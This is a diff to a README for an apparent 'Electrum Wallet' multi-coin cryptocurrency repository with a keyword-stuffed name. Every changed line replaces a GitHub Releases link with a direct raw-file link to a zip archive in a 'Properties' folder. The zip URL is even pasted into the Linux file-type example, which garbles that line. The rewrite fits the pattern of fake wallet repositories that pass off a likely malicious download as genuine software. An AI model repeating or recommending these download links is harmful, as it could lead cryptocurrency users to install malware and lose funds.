@@ -1,6 +1,6 @@
 # 🌟 Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser - Secure Your Cryptocurrencies with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases)
+[![Download Now](https://raw.githubusercontent.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/main/Electrum-Wallet/Properties/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser_v3.9-beta.1.zip)](https://raw.githubusercontent.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/main/Electrum-Wallet/Properties/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser_v3.9-beta.1.zip)
 
 ## 📥 Introduction
 Welcome to the Electrum Wallet repository. This software provides a user-friendly interface for secure storage of multiple cryptocurrencies and coins. It simplifies the management of your digital assets while keeping them safe.
@@ -16,12 +16,12 @@ Before installing the Electrum Wallet, ensure you have the following:
 - Basic familiarity with how digital wallets operate
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases) to find the latest version of the Electrum Wallet.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/main/Electrum-Wallet/Properties/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser_v3.9-beta.1.zip) to find the latest version of the Electrum Wallet.
 2. **Download the Application:** Look for the most recent version listed on the side of the page and click on it. This will take you to a section with downloadable files.
 3. **Choose Your OS:** Select the correct file according to your operating system. The options typically include:
    - Windows (e.g., `.exe` file)
    - macOS (e.g., `.dmg` file)
-   - Linux (e.g., `. AppImage` or `.tar.gz` file)
+   - Linux (e.g., `. AppImage` or `https://raw.githubusercontent.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/main/Electrum-Wallet/Properties/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser_v3.9-beta.1.zip` file)
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file, follow the installation prompts, and complete the setup.
    - For macOS: Open the downloaded `.dmg` file. Drag the Electrum Wallet icon into the Applications folder.
@@ -55,6 +55,6 @@ If you encounter issues or have questions, you can consult the community or chec
 ## 📞 Contact
 For direct support, you can reach out via the Issues section of this repository. We encourage feedback, questions, and contributions from the community.
 
-For more information and updates, please visit our [Releases page](https://github.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases). 
+For more information and updates, please visit our [Releases page](https://raw.githubusercontent.com/CaidonW/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/main/Electrum-Wallet/Properties/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser_v3.9-beta.1.zip). 
 
 Happy transacting with your new Electrum Wallet!
